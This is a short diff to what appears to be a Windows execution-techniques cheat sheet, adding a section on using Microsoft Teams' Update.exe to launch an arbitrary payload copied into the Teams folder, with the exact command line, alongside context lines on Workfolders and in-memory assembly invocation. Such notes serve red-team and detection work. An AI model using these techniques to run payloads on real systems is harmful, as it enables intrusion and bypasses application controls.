@@ -14,3 +14,6 @@ $asm.EntryPoint.Invoke($null, @(,$passed))
 You can use the Workfolders application in Windows to run any binary in the current directory after renaming it to "control.exe":
 ![](screenshot.png)
 
+## Using Teams Update.exe
+Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied:   
+`%userprofile%\AppData\Local\Microsoft\Teams\Update.exe --processStart payload.exe --process-start-args "whatever args"`   
